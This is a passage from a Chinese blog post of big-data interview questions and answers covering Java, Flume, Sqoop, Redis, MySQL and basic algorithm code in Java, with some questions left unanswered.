方法在垃圾收集器将对象</p><p>从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在销毁对象时调用</p><p>的，通过重写 finalize() 方法可以整理系统资源或者执行其他清理工作。</p><h2 id="-76"><a href="#-76" class="headerlink" title></a></h2><h2 id="19-和-Equals-区别"><a href="#19-和-Equals-区别" class="headerlink" title="19..==和 Equals 区别"></a>19..==和 Equals 区别</h2><p>== : 如果比较的是基本数据类型，那么比较的是变量的值</p><p>如果比较的是引用数据类型，那么比较的是地址值（两个对象是否指向同一块内</p><p>存）</p><p>equals:如果没重写 equals 方法比较的是两个对象的地址值。</p><p>如果重写了 equals 方法后我们往往比较的是对象中的属性的内容</p><p>equals 方法是从 Object 类中继承的，默认的实现就是使用==</p><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><h2 id="-77"><a href="#-77" class="headerlink" title></a></h2><h2 id="20-比较ArrayList，LinkedList的存储特性和读写性能"><a href="#20-比较ArrayList，LinkedList的存储特性和读写性能" class="headerlink" title="20.比较ArrayList，LinkedList的存储特性和读写性能"></a>20.比较ArrayList，LinkedList的存储特性和读写性能</h2><h2 id="-78"><a href="#-78" class="headerlink" title></a></h2><h2 id="21-Java-类加载过程"><a href="#21-Java-类加载过程" class="headerlink" title="21.Java 类加载过程"></a>21.Java 类加载过程</h2><p>Java类加载需要经历一下几个过程：</p><ul><li>加载</li></ul><p>加载时类加载的第一个过程，在这个阶段，将完成一下三件事情：</p><ol><li>通过一个类的全限定名获取该类的二进制流。</li><li>将该二进制流中的静态存储结构转化为方法去运行时数据结构。 </li><li>在内存中生成该类的Class对象，作为该类的数据访问入口。</li></ol><ul><li>验证</li></ul><p>验证的目的是为了确保Class文件的字节流中的信息不回危害到虚拟机.在该阶段主要完成以下四钟验证: </p><ol><li>文件格式验证：验证字节流是否符合Class文件的规范，如主次版本号是否在当前虚拟机范围内，常量池中的常量是否有不被支持的类型.</li><li>元数据验证:对字节码描述的信息进行语义分析，如这个类是否有父类，是否集成了不被继承的类等。</li><li>字节码验证：是整个验证过程中最复杂的一个阶段，通过验证数据流和控制流的分析，确定程序语义是否正确，主要针对方法体的验证。如：方法中的类型转换是否正确，跳转指令是否正确等。</li><li>符号引用验证：这个动作在后面的解析过程中发生，主要是为了确保解析动作能正确执行。</li><li>准备</li></ol><p>准备阶段是为类的静态变量分配内存并将其初始化为默认值，这些内存都将在方法区中进行分配。准备阶段不分配类中的实例变量的内存，实例变量将会在对象实例化时随着对象一起分配在Java堆中。</p><ul><li>解析</li></ul><p>该阶段主要完成符号引用到直接引用的转换动作。解析动作并不一定在初始化动作完成之前，也有可能在初始化之后。</p><ul><li>初始化</li></ul><p>初始化时类加载的最后一步，前面的类加载过程，除了在加载阶段用户应用程序可以通过自定义类加载器参与之外，其余动作完全由虚拟机主导和控制。到了初始化阶段，才真正开始执行类中定义的Java程序代码。</p><h2 id="-79"><a href="#-79" class="headerlink" title></a></h2><h2 id="22-java中垃圾收集的方法有哪些"><a href="#22-java中垃圾收集的方法有哪些" class="headerlink" title="22.java中垃圾收集的方法有哪些?"></a>22.java中垃圾收集的方法有哪些?</h2><p>23.如何判断一个对象是否存活?(或者GC对象的判定方法)</p><h2 id="-80"><a href="#-80" class="headerlink" title></a></h2><p>判断一个对象是否存活有两种方法: </p><ol><li>引用计数法</li><li>可达性算法(引用链法)</li></ol><p>24.jvm、堆栈</p><h1 id="九-Elasticsearch"><a href="#九-Elasticsearch" class="headerlink" title="九.Elasticsearch"></a>九.Elasticsearch</h1><h2 id="1-为什么要用es？存进es的数据是什么格式的，怎么查询"><a href="#1-为什么要用es？存进es的数据是什么格式的，怎么查询" class="headerlink" title="1.为什么要用es？存进es的数据是什么格式的，怎么查询"></a>1.为什么要用es？存进es的数据是什么格式的，怎么查询</h2><h1 id="-81"><a href="#-81" class="headerlink" title></a></h1><h1 id="十-Flume"><a href="#十-Flume" class="headerlink" title="十.Flume"></a>十.Flume</h1><h2 id="1-什么是flume"><a href="#1-什么是flume" class="headerlink" title="1.什么是flume"></a>1.什么是flume</h2><p>a.Flume是一个分布式、可靠、和高可用的海量日志采集、聚合和传输的系统。</p><p>b.Flume可以采集文件，socket数据包等各种形式源数据，又可以将采集到的数据输出到HDFS、hbase、hive、kafka等众多外部存储系统中</p><p>c.一般的采集需求，通过对flume的简单配置即可实现</p><p>d.ume针对特殊场景也具备良好的自定义扩展能力，因此，flume可以适用于大部分的日常数据采集场景</p><h2 id="2-flume运行机制"><a href="#2-flume运行机制" class="headerlink" title="2.flume运行机制"></a>2.flume运行机制</h2><ol><li><p>Flume分布式系统中最<strong>核心的角色是agent</strong>，flume采集系统就是由一个个agent所连接起来形成</p></li><li><p><strong>每一个agent相当于一个数据传递员，内部有三个组件：</strong></p></li><li><ol><li>Source：采集源，用于跟数据源对接，以获取数据</li><li>Sink：下沉地，采集数据的传送目的，用于往下一级agent传递数据或者往最终存储系统传递数据</li><li>Channel：angent内部的数据传输通道，用于从source将数据传递到sink</li><li></li></ol></li></ol><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><h2 id="-82"><a href="#-82" class="headerlink" title></a></h2><h2 id="3-Flume采集数据到Kafka中丢数据怎么办"><a href="#3-Flume采集数据到Kafka中丢数据怎么办" class="headerlink" title="3.Flume采集数据到Kafka中丢数据怎么办"></a>3.Flume采集数据到Kafka中丢数据怎么办</h2><h2 id="-83"><a href="#-83" class="headerlink" title></a></h2><h2 id="4-Flume怎么进行监控"><a href="#4-Flume怎么进行监控" class="headerlink" title="4.Flume怎么进行监控?"></a>4.Flume怎么进行监控?</h2><h2 id="-84"><a href="#-84" class="headerlink" title></a></h2><h2 id="5-Flume的三层架构，collector、agent、storage"><a href="#5-Flume的三层架构，collector、agent、storage" class="headerlink" title="5.Flume的三层架构，collector、agent、storage"></a>5.Flume的三层架构，collector、agent、storage</h2><h1 id="十一-Sqoop"><a href="#十一-Sqoop" class="headerlink" title="十一.Sqoop"></a>十一.Sqoop</h1><h2 id="1-Sqoop底层运行的任务是什么"><a href="#1-Sqoop底层运行的任务是什么" class="headerlink" title="1.Sqoop底层运行的任务是什么"></a>1.Sqoop底层运行的任务是什么</h2><p>只有Map阶段，没有Reduce阶段的任务。</p><h2 id="-85"><a href="#-85" class="headerlink" title></a></h2><h2 id="2-sqoop的迁移数据的原理"><a href="#2-sqoop的迁移数据的原理" class="headerlink" title="2.sqoop的迁移数据的原理"></a>2.sqoop的迁移数据的原理</h2><h2 id="-86"><a href="#-86" class="headerlink" title></a></h2><h2 id="3-Sqoop参数"><a href="#3-Sqoop参数" class="headerlink" title="3.Sqoop参数"></a>3.Sqoop参数</h2><blockquote><p>/opt/module/sqoop/bin/sqoop import \</p><p>–connect \</p><p>–username \</p><p>–password \</p><p>–target-dir \</p><p>–delete-target-dir \</p><p>–num-mappers \</p><p>–fields-terminated-by  \</p><p>–query  “$2” ‘ and $CONDITIONS;’</p></blockquote><h2 id="-87"><a href="#-87" class="headerlink" title></a></h2><h2 id="4-Sqoop导入导出Null存储一致性问题"><a href="#4-Sqoop导入导出Null存储一致性问题" class="headerlink" title="4.Sqoop导入导出Null存储一致性问题"></a>4.Sqoop导入导出Null存储一致性问题</h2><p>Hive中的Null在底层是以“\N”来存储，而MySQL中的Null在底层就是Null，为了保证数据两端的一致性。在导出数据时采用–input-null-string和–input-null-non-string两个参数。导入数据时采用–null-string和–null-non-string。</p><h2 id="-88"><a href="#-88" class="headerlink" title></a></h2><h2 id="5-Sqoop数据导出一致性问题"><a href="#5-Sqoop数据导出一致性问题" class="headerlink" title="5.Sqoop数据导出一致性问题"></a>5.Sqoop数据导出一致性问题</h2><p>1）场景1：如Sqoop在导出到Mysql时，使用4个Map任务，过程中有2个任务失败，那此时MySQL中存储了另外两个Map任务导入的数据，此时老板正好看到了这个报表数据。而开发工程师发现任务失败后，会调试问题并最终将全部数据正确的导入MySQL，那后面老板再次看报表数据，发现本次看到的数据与之前的不一致，这在生产环境是不允许的。</p><p>2）场景2：设置map数量为1个（不推荐，面试官想要的答案不只这个）</p><p>多个Map任务时，采用–staging-table方式，仍然可以解决数据一致性问题。</p><h1 id="十二-Redis"><a href="#十二-Redis" class="headerlink" title="十二.Redis"></a>十二.Redis</h1><h2 id="1-缓存穿透、缓存雪崩、缓存击穿"><a href="#1-缓存穿透、缓存雪崩、缓存击穿" class="headerlink" title="1.缓存穿透、缓存雪崩、缓存击穿"></a>1.缓存穿透、缓存雪崩、缓存击穿</h2><p>1）缓存穿透是指查询一个一定不存在的数据。由于缓存命不中时会去查询数据库，查不到</p><p>数据则不写入缓存，这将导致这个不存在的数据每次请求都要到数据库去查询，造成缓存穿</p><p>透。</p><p>解决方案：</p><p>① 是将空对象也缓存起来，并给它设置一个很短的过期时间，最长不超过 5 分钟</p><p>② 采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的 bitmap 中，一个一定</p><p>不存在的数据会被这个 bitmap 拦截掉，从而避免了对底层存储系统的查询压力</p><p>2）如果缓存集中在一段时间内失效，发生大量的缓存穿透，所有的查询都落在数据库上，</p><p>就会造成缓存雪崩。</p><p>解决方案：</p><p>尽量让失效的时间点不分布在同一个时间点</p><p>3）缓存击穿，是指一个 key 非常热点，在不停的扛着大并发，当这个 key 在失效的瞬间，</p><p>持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。</p><p>可以设置 key 永不过期</p><h2 id="-89"><a href="#-89" class="headerlink" title></a></h2><h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2.数据类型"></a>2.数据类型</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><h2 id="-90"><a href="#-90" class="headerlink" title></a></h2><h2 id="3-持久化"><a href="#3-持久化" class="headerlink" title="3.持久化"></a>3.持久化</h2><p><strong>1）RDB 持久化：</strong></p><p><strong>① 在指定的时间间隔内持久化</strong></p><p><strong>② 服务 shutdown 会自动持久化</strong></p><p><strong>③ 输入 bgsave 也会持久化</strong></p><p><strong>2）AOF : 以日志形式记录每个更新操作</strong></p><p>Redis 重新启动时读取这个文件，重新执行新建、修改数据的命令恢复数据。</p><p><strong>保存策略：</strong></p><p>推荐（并且也是默认）的措施为每秒持久化一次，这种策略可以兼顾速度和安全性。</p><p><strong>缺点：</strong></p><p>1 比起 RDB 占用更多的磁盘空间</p><p>2 恢复备份速度要慢</p><p>3 每次读写都同步的话，有一定的性能压力</p><p>4 存在个别 Bug，造成恢复不能</p><p><strong>选择策略：</strong></p><p>官方推荐：</p><p>string</p><p>字符串</p><p>list</p><p>可以重复的集合</p><p>set</p><p>不可以重复的集合</p><p>hash</p><p>类似于 Map&lt;String,String&gt;</p><p>zset(sorted set）</p><p>带分数的 set </p><p>如果对数据不敏感，可以选单独用 RDB；不建议单独用 AOF，因为可能出现 Bug;如果只是做纯内存缓存，可以都不用</p><h2 id="-91"><a href="#-91" class="headerlink" title></a></h2><h2 id="4-悲观锁和乐观锁"><a href="#4-悲观锁和乐观锁" class="headerlink" title="4.悲观锁和乐观锁"></a>4.悲观锁和乐观锁</h2><p>悲观锁：执行操作前假设当前的操作肯定（或有很大几率）会被打断（悲观）。基于这个假设，我们在做操作前就会把相关资源锁定，不允许自己执行期间有其他操作干扰。</p><p>乐观锁：执行操作前假设当前操作不会被打断（乐观）。基于这个假设，我们在做操作前不会锁定资源，万一发生了其他操作的干扰，那么本次操作将被放弃。Redis 使用的就是乐观锁。</p><h2 id="-92"><a href="#-92" class="headerlink" title></a></h2><h2 id="5-redis-是单线程的，为什么那么快"><a href="#5-redis-是单线程的，为什么那么快" class="headerlink" title="5.redis 是单线程的，为什么那么快"></a>5.redis 是单线程的，为什么那么快</h2><p>1)完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。</p><p>2)数据结构简单，对数据操作也简单，Redis 中的数据结构是专门进行设计的</p><p>3)采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗</p><p>4)使用多路 I/O 复用模型，非阻塞 IO</p><p>5)使用底层模型不同，它们之间底层实现方式以及与客户端之间通信的应用协议不一样，</p><p>Redis 直接自己构建了 VM 机制 ，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求</p><h2 id="-93"><a href="#-93" class="headerlink" title></a></h2><h2 id="6-redis的热键问题？怎么解决？"><a href="#6-redis的热键问题？怎么解决？" class="headerlink" title="6.redis的热键问题？怎么解决？"></a>6.redis的热键问题？怎么解决？</h2><h1 id="十三-Mysql"><a href="#十三-Mysql" class="headerlink" title="十三.Mysql"></a>十三.Mysql</h1><h2 id="-94"><a href="#-94" class="headerlink" title></a></h2><h2 id="1-请写出mysql登录命令，用户名user，密码123456，地址192-168-1-130"><a href="#1-请写出mysql登录命令，用户名user，密码123456，地址192-168-1-130" class="headerlink" title="1.请写出mysql登录命令，用户名user，密码123456，地址192.168.1.130"></a>1.请写出mysql登录命令，用户名user，密码123456，地址192.168.1.130</h2><p>mysql -h 192.168.1.130 -uuser -p123456 -P3306 -Dwemeta_test</p><h2 id="-95"><a href="#-95" class="headerlink" title></a></h2><h2 id="2-为什么MySQL的索引要使用B-树而不是其它树形结构-比如B树？"><a href="#2-为什么MySQL的索引要使用B-树而不是其它树形结构-比如B树？" class="headerlink" title="2.为什么MySQL的索引要使用B+树而不是其它树形结构?比如B树？"></a>2.为什么MySQL的索引要使用B+树而不是其它树形结构?比如B树？</h2><p>B树</p><p>​    B树不管叶子节点还是非叶子节点，都会保存数据，这样导致在非叶子节点中能保存的指针数量变少（有些资料也称为扇出）</p><p>指针少的情况下要保存大量数据，只能增加树的高度，导致IO操作变多，查询性能变低；</p><p>B+树</p><p>​       1.单一节点存储更多的元素，使得查询的IO次数更少。<br>　　　　2.所有查询都要查找到叶子节点，查询性能稳定。<br>　　　　3.所有叶子节点形成有序链表，便于范围查询,远远高于B-树</p><h1 id="-96"><a href="#-96" class="headerlink" title></a></h1><h1 id="十四-数据结构与算法"><a href="#十四-数据结构与算法" class="headerlink" title="十四.数据结构与算法"></a>十四.数据结构与算法</h1><h2 id="-97"><a href="#-97" class="headerlink" title></a></h2><h2 id="1-二分查找"><a href="#1-二分查找" class="headerlink" title="1.二分查找"></a>1.二分查找</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wedoctor.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Binarysearch</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bsearchWithoutRecursion</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (arr[mid] &gt; key)</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &lt; key)</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">23</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> num = bsearchWithoutRecursion(arr, <span class="number">9</span>);</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-快排"><a href="#2-快排" class="headerlink" title="2.快排"></a>2.快排</h2><h2 id="3-归并排序"><a href="#3-归并排序" class="headerlink" title="3.归并排序"></a>3.归并排序</h2><h2 id="4-冒泡排序"><a href="#4-冒泡排序" class="headerlink" title="4.冒泡排序"></a>4.冒泡排序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wedoctor.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">2</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        bubbleSort(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//控制多少轮</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//控制每一轮的次数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= arr.length -<span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> temp;</span><br><span class="line">                    temp = arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-字符串反转"><a href="#5-字符串反转" class="headerlink" title="5.字符串反转"></a>5.字符串反转</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wedoctor.str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrReverse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  String <span class="title">getNewStr</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(str);</span><br><span class="line">        String newStr = sb.reverse().toString();</span><br><span class="line">        <span class="keyword">return</span> newStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(getNewStr(<span class="string">"thjymhr"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-Btree简单讲一下"><a href="#6-Btree简单讲一下" class="headerlink" title="6.Btree简单讲一下"></a>6.Btree简单讲一下</h2><p>B树(B-树)是一种适合外查找的搜索树，是一种平衡的多叉树 </p><p>B树的每个结点包含着结点的值和结点所处的位置</p><h2 id="-98"><a href="#-98" class="headerlink" title></a></h2><h2 id="7-动态规划-最大连续子序列和"><a href="#7-动态规划-最大连续子序列和" class="headerlink" title="7.动态规划 最大连续子序列和"></a>7.动态规划 最大连续子序列和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wedoctor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxSum</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findMax</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (arr.length == <span class="number">1</span>)&#123;</span><br><span class="line">             <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (arr.length) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span>[] leftArr = Arrays.copyOfRange(arr, <span class="number">0</span>, mid);</span><br><span class="line">        <span class="keyword">int</span>[] rightArr = Arrays.copyOfRange(arr, mid, arr.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> lenLeft = findMax(leftArr);</span><br><span class="line">        <span class="keyword">int</span> lenRight = findMax(rightArr);</span><br><span class="line">        <span class="keyword">int</span> lenMid = maxInMid(leftArr, rightArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = Math.max(Math.max(lenLeft,lenRight),lenMid);</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">maxInMid</span><span class="params">(<span class="keyword">int</span> left[],<span class="keyword">int</span> right[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxLeft = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> maxRight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmpLeft = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmpRight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt; left.length;i++)&#123;</span><br><span class="line">            tmpLeft = tmpLeft + left[left.length - <span class="number">1</span> - i];</span><br><span class="line">            maxLeft = Math.max(tmpLeft,maxLeft);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt; right.length;i++)&#123;</span><br><span class="line">            tmpRight = tmpRight + right[i];</span><br><span class="line">            maxRight = Math.max(tmpRight,maxRight);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  maxRight + maxLeft;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = &#123;<span class="number">3</span>,-<span class="number">1</span>,<span class="number">10</span>&#125;;</span><br><span class="line">        System.out.println(findMax(arr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-二叉树概念，特点及代码实现"><a href="#8-二叉树概念，特点及代码实现" class="headerlink" title="8.二叉树概念，特点及代码实现"></a>8.二叉树概念，特点及代码实现</h2><p>二叉树是n(n&gt;=0)个结点的有限集合，该集合或者为空集（称为空二叉树），或者由一个根结点和两棵互不相交的、分别称为根结点的左子树和右子树组成。</p><p>特点：</p><ul><li>每个结点最多有两颗子树，所以二叉树中不存在度大于2的结点。</li><li>左子树和右子树是有顺序的，次序不能任意颠倒。</li><li>即使树中某结点只有一棵子树，也要区分它是左子树还是右子树。</li></ul><p>实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wedoctor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    BinaryTreeNode left;</span><br><span class="line">    BinaryTreeNode right;</span><br><span class="line"></span><br><span class="line">    BinaryTreeNode (<span class="keyword">int</span> x) &#123;</span><br><span class="line">        data= x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BinaryTreeNode</span><span class="params">(<span class="keyword">int</span> data, BinaryTreeNode left, BinaryTreeNode right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="keyword">this</span>.left = left;</span><br><span class="line">        <span class="keyword">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span 